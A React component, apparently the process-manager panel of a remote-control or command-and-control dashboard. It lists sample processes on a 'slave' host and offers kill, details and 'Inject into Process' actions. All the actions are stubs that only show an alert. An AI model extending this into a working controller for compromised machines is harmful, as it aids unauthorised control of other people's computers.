"use client";

import { useState, useEffect } from "react";

interface Process {
  pid: number;
  name: string;
  memory: string;
}

interface SlaveData {
  freq: number;
  slaveIP: string;
  slaveLastCheckin: string;
  slaveName: string;
  slavePing: string;
  slaveStatus: string;
}

export default function ProcessManager({ slave }: { slave: SlaveData }) {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [contextMenu, setContextMenu] = useState<{ x: number; y: number; process: Process | null } | null>(null);

  // Simulated process data (Replace with API call if needed)
  useEffect(() => {
    setProcesses([
      { pid: 1234, name: "chrome.exe", memory: "250MB" },
      { pid: 5678, name: "explorer.exe", memory: "180MB" },
      { pid: 9012, name: "cmd.exe", memory: "25MB" },
      { pid: 3456, name: "notepad.exe", memory: "15MB" },
    ]);
  }, []);

  // Handle right-click on a process
const handleRightClick = (event: React.MouseEvent, process: Process) => {
    event.preventDefault(); // Prevent default context menu
    if (contextMenu && contextMenu.process?.pid === process.pid) {
        setContextMenu(null); // Close menu if right-clicking the same process
    } else {
        setContextMenu({ x: event.clientX, y: event.clientY, process });
    }
};

  // Handle action selection from the menu
  const handleMenuAction = (action: string) => {
    if (contextMenu?.process) {
      alert(`Action: ${action} on ${contextMenu.process.name} (PID: ${contextMenu.process.pid})`);
    }
    setContextMenu(null); // Close menu
  };

  return (
    <div className="w-full rounded-lg text-white relative">
      <h1 className="text-2xl font-bold mb-4">Process Manager</h1>

      {/* Process List */}
      <ul className="border border-neutral-600 rounded-lg divide-y divide-neutral-700">
        {processes.map((process) => (
          <li
            key={process.pid}
            onContextMenu={(event) => handleRightClick(event, process)}
            className="p-2 hover:bg-neutral-700 cursor-pointer flex justify-between"
          >
            <span>{process.name}</span>
            <span className="text-neutral-400">{process.memory}</span>
          </li>
        ))}
      </ul>

      {/* Context Menu */}
      {contextMenu && (
        <div
          className="bg-neutral-900 border border-neutral-700 rounded-lg shadow-lg p-2"
          style={{ top: contextMenu.y, left: contextMenu.x }}
        >
          <button className="block w-full text-left px-4 py-2 hover:bg-neutral-700" onClick={() => handleMenuAction("Kill")}>
            Kill Process
          </button>
          <button className="block w-full text-left px-4 py-2 hover:bg-neutral-700" onClick={() => handleMenuAction("View Details")}>
            View Details
          </button>
          <button className="block w-full text-left px-4 py-2 hover:bg-neutral-700" onClick={() => handleMenuAction("Suspend")}>
            Inject into Process
          </button>
        </div>
      )}
    </div>
  );
}
